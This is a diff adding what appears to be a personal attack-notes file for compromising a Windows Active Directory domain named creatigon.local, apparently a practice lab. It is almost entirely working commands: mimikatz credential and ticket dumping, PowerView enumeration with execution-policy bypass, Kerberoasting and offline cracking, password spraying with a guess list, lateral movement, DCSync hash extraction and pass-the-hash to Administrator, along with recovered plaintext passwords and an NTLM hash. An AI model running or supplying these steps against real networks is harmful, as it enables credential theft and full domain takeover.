@@ -1,0 +1,103 @@
+privilege::debug
+
+sekurlsa::logonpasswords # check logon password
+sekurlsa::tickets 	 # check stored tickets
+
+spawn system nt cmd using 
+psexec.exe -i -s cmd.exe
+
+net user /domain  # domain user enumeration
+
+# powerview-dev.ps1 for enumeration
+powershell -ep bypass
+..\PowerView-Dev.ps1
+Get-NetComputer
+
+Get-NetComputer | select dnshostname,operatingsystem,samaccountname
+Get-NetUser | select description,serviceprincipalname,samaccountname
+
+
+# password cracking with powerview using serviceprincipalname
+
+Add-Type -AssemblyName System.IdentityModel
+
+New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList '<serviceprincipalname>'
+
+klist # to export
+
+# now run mimikatz to export the list into files
+
+.\mimikatz.exe "privilege::debug" "kerberos::list /export" "exit"
+
+download the file with creatigon-dc
+
+# cracking using kerberoast
+python3 /usr/share/kerberoast/tgsrepcrack.py pass.txt 2-40a10000-hangul\$@CREATIGON-DC\~SQLDatabase.creatigon.local\~1337-CREATIGON.LOCAL.kirbi
+
+
+
+# 
+Note - password!@34                                      CREATIGON-DC/SQLDatabase.creatigon.local:1337 sqldatabase
+
+# loing into the domain
+
+runas /env /user:sqldatabase@creatigon cmd.exe
+or loging using 
+ctrl + click on cmd and shift + click on cmd.exe
+and open as another user
+
+
+#test for session take over
+Enter-PSSession -ComputerName creatigon-dc    # will work if remote access is allowed
+
+# attempting password spraying
+password spraying can logout the user
+Invoke-DomainPasswordSpray -Password password!@34
+# try different passwords and combination
+Invoke-DomainPasswordSpray -Password password1
+
+password1234
+password!234
+password!@34
+password!@#4
+password!@#$
+password123$
+password12$%
+password1@#$
+password123!
+
+
+found password for zinmar:password!@#4
+
+#open and cmd as zinmar and  
+runas /env /user:zinmar@creatigon cmd.exe
+# logining into creatigon-dc as zinmar
+Enter-PSSession -ComputerName creatigon-dc
+
+# logining into creatigon-dc as creatigon:password123!
+runas /env /user:creatigon@creatigon cmd.exe
+Enter-PSSession -ComputerName creatigon-dc
+
+#creatigon has admin access
+upload mimikatz.exe to dc
+.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
+
+# dc synchronization with mimikatz to extract hashes 
+.\mimikatz.exe "privilege::debug" "lsadump::dcsync /domain:creatigon.local /user:creatigon /all /csv" "exit" 
+
+# mimikatz pass the hash to get Administrator
+
+#launch a cmd with nt authority
+psexec.exe -s -i cmd.exe
+
+# in the local
+.\mimikatz.exe "privilege::debug" "sekurlsa::pth /domain:creatigon.local /user:Administrator /ntlm:13b1e64400203ecf38b1fdea2b11a09f" "exit"
+
+# in the spawned cmd run
+psexec.exe //creatigon-dc.creatigon.local cmd.exe
+
+
+
+
+
+
